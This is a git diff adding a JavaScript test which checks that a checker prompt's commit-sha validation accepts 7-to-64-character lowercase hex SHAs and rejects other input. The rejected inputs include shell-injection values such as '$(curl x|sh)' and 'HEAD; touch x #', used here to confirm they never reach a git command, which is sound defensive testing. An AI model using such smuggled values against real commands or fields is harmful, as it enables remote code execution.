@@ -356,6 +356,24 @@ test('the checker confirms a fifth point: the task tip is the reported commit, n
   }
 });
 
+// spec 8 (owner, regress-security-01): one pattern, /^[0-9a-f]{7,64}$/, for commits and this tip check,
+// so a SHA-256 sha (64 hex) is named; uppercase, too short, too long and injection text are not.
+test('the checker tip check names a 7-64 lowercase hex sha, SHA-256 included, and nothing else', () => {
+  const sha256 = 'a'.repeat(32) + '0123456789abcdef'.repeat(2);
+  assert.equal(sha256.length, 64);
+  for (const commit of [sha256, 'abcdef1', '0123456789abcdef0123456789abcdef01234567']) {
+    const p = lib.checkerPrompt(taskA, { ...implResult, commit }, buildArgs());
+    assert.ok(p.includes(`(\`${commit}\`)`), commit);
+    assert.ok(p.includes(`git merge-base --is-ancestor ${commit} temper/e`), commit);
+    assert.doesNotMatch(p, /reported no commit sha/, commit);
+  }
+  for (const commit of [sha256.toUpperCase(), 'ABCDEF12', 'abcdef', 'a'.repeat(65), '$(curl x|sh)', 'HEAD; touch x #', 'HEAD']) {
+    const p = lib.checkerPrompt(taskA, { ...implResult, commit }, buildArgs());
+    assert.ok(!p.includes(commit), commit);
+    assert.match(p, /reported no commit sha, so this check fails\./, commit);
+  }
+});
+
 test('on an ssh host, every agent that commits on the epic branch detaches only after the commit check', () => {
   for (const name of ['merge', 'checkpoint', 'behaviourSpec', 'acceptance', 'green', 'fix', 'docs', 'evidence']) {
     const t = ssh[name];
